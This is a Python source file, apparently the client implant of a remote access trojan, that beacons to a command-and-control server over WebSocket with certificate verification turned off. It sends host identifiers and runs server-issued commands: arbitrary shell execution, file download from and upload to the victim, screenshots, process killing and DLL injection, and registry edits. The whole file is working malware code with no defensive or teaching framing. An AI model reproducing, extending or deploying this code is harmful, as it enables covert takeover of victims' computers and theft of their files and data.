import os
import ssl
import json
import time
import base64
import socket
import random
import hashlib
import websockets
import asyncio
from typing import Dict, Any
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from .remote_control import RemoteControl
from .process_manager import ProcessManager
from .registry_manager import RegistryManager
import uuid

class C2Communication:
    def __init__(self, server_url: str, psk: str):
        self.server_url = server_url.replace('https://', 'wss://')  # Convert to WebSocket URL
        self.psk = psk
        self.session_key = self._derive_session_key()
        self.websocket = None
        self.client_id = None
        self.remote_control = RemoteControl()
        self.process_manager = ProcessManager()
        self.registry_manager = RegistryManager()
        self.running = True
        
    def _derive_session_key(self) -> bytes:
        """Derive session key from PSK"""
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=b'hydra_c2',
            iterations=100000
        )
        return base64.urlsafe_b64encode(
            kdf.derive(self.psk.encode())
        )

    def _generate_hardware_id(self) -> str:
        """Generate unique hardware ID"""
        try:
            hostname = socket.gethostname()
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff)
                          for elements in range(0,2*6,2)][::-1])
            id_string = f"{hostname}:{mac}"
            return hashlib.sha256(id_string.encode()).hexdigest()[:16]
        except:
            return hashlib.sha256(os.urandom(16)).hexdigest()[:16]
        
    async def _connect(self):
        """Establish WebSocket connection with retry"""
        while not self.websocket and self.running:
            try:
                ssl_context = ssl.create_default_context()
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
                
                self.websocket = await websockets.connect(
                    f"{self.server_url}/c2",
                    ssl=ssl_context,
                    ping_interval=20,
                    ping_timeout=60,
                    close_timeout=10
                )
                print("[+] Connected to C2 server")
                return True
            except Exception as e:
                print(f"[-] Connection error: {str(e)}")
                await asyncio.sleep(10)  # Wait before retry
        return False

    async def _send_beacon(self):
        """Send beacon to C2 server"""
        try:
            # Get system information
            hostname = socket.gethostname()
            username = os.getenv('USERNAME')
            os_info = f"{os.name} {os.getenv('OS')}"
            
            # Generate client ID if not exists
            if not self.client_id:
                self.client_id = self._generate_hardware_id()
            
            # Prepare beacon data
            data = {
                'type': 'register',
                'client_id': self.client_id,
                'hostname': hostname,
                'ip': socket.gethostbyname(hostname),
                'os': os_info,
                'timestamp': datetime.now().isoformat()
            }
            
            await self.websocket.send(json.dumps(data))
            return True
        except Exception as e:
            print(f"[-] Beacon error: {str(e)}")
            return False

    async def run(self):
        """Main communication loop"""
        self.running = True
        while self.running:
            try:
                if not self.websocket:
                    if not await self._connect():
                        continue

                # Send initial beacon
                if not await self._send_beacon():
                    self.websocket = None
                    continue

                # Main receive loop
                async for message in self.websocket:
                    try:
                        data = json.loads(message)
                        
                        if data.get('type') == 'register_ack':
                            print("[+] Registration acknowledged")
                            
                        elif data.get('type') == 'command':
                            # Handle command
                            cmd_response = self._handle_command(data)
                            await self.websocket.send(json.dumps({
                                'type': 'command_output',
                                'client_id': self.client_id,
                                **cmd_response
                            }))
                            
                        # Send periodic beacon
                        await self.websocket.send(json.dumps({
                            'type': 'beacon',
                            'client_id': self.client_id,
                            'timestamp': datetime.now().isoformat()
                        }))
                        
                    except json.JSONDecodeError:
                        continue
                        
            except websockets.exceptions.ConnectionClosed:
                print("[-] Connection closed")
                self.websocket = None
                await asyncio.sleep(10)
                
            except Exception as e:
                print(f"[-] Error in communication loop: {str(e)}")
                self.websocket = None
                await asyncio.sleep(10)

    async def stop(self):
        """Stop C2 communication"""
        self.running = False
        if self.websocket:
            await self.websocket.close()
            self.websocket = None
        # Cleanup
        if self.remote_control:
            self.remote_control.stop_screen_capture()
            self.remote_control.stop_input_control()

    def _handle_command(self, command: Dict[str, Any]) -> Dict[str, Any]:
        """Handle command from C2 server"""
        try:
            cmd_type = command.get('command')
            args = command.get('args', [])
            
            if cmd_type == 'shell':
                # Execute shell command
                import subprocess
                result = subprocess.run(
                    args,
                    capture_output=True,
                    text=True
                )
                return {
                    'type': 'shell_output',
                    'data': {
                        'output': result.stdout + result.stderr,
                        'exit_code': result.returncode
                    }
                }
                
            elif cmd_type == 'download':
                # Download file from target
                file_path = args[0]
                if os.path.exists(file_path):
                    with open(file_path, 'rb') as f:
                        content = f.read()
                    return {
                        'type': 'file_data',
                        'data': {
                            'content': base64.b64encode(content).decode()
                        }
                    }
                return {'error': 'File not found'}
                
            elif cmd_type == 'upload':
                # Upload file to target
                file_path = args[0]
                content = base64.b64decode(args[1])
                with open(file_path, 'wb') as f:
                    f.write(content)
                return {'type': 'upload_status', 'data': {'status': 'success'}}
                
            elif cmd_type == 'screenshot':
                # Capture screen
                self.remote_control.start_screen_capture()
                time.sleep(0.1)  # Wait for capture
                self.remote_control.stop_screen_capture()
                return {'type': 'screenshot', 'data': {'status': 'success'}}
                
            elif cmd_type == 'process':
                # Process management
                action = args[0]
                if action == 'list':
                    processes = self.process_manager.get_process_list()
                    return {'type': 'process_list', 'data': processes}
                elif action == 'info':
                    pid = int(args[1])
                    info = self.process_manager.get_process_info(pid)
                    return {'type': 'process_info', 'data': info}
                elif action == 'kill':
                    pid = int(args[1])
                    success = self.process_manager.kill_process(pid)
                    return {'type': 'process_kill', 'data': {'success': success}}
                elif action == 'suspend':
                    pid = int(args[1])
                    success = self.process_manager.suspend_process(pid)
                    return {'type': 'process_suspend', 'data': {'success': success}}
                elif action == 'resume':
                    pid = int(args[1])
                    success = self.process_manager.resume_process(pid)
                    return {'type': 'process_resume', 'data': {'success': success}}
                elif action == 'inject':
                    pid = int(args[1])
                    dll_path = args[2]
                    success = self.process_manager.inject_dll(pid, dll_path)
                    return {'type': 'process_inject', 'data': {'success': success}}
                    
            elif cmd_type == 'registry':
                # Registry operations
                action = args[0]
                if action == 'read':
                    key_path = args[1]
                    value_name = args[2]
                    value = self.registry_manager.read_value(key_path, value_name)
                    return {'type': 'registry_read', 'data': value}
                elif action == 'write':
                    key_path = args[1]
                    value_name = args[2]
                    value_type = args[3]
                    value_data = args[4]
                    success = self.registry_manager.write_value(key_path, value_name, value_type, value_data)
                    return {'type': 'registry_write', 'data': {'success': success}}
                elif action == 'delete':
                    key_path = args[1]
                    value_name = args[2]
                    success = self.registry_manager.delete_value(key_path, value_name)
                    return {'type': 'registry_delete', 'data': {'success': success}}
                    
            return {'error': 'Unknown command'}
            
        except Exception as e:
            return {'error': str(e)} 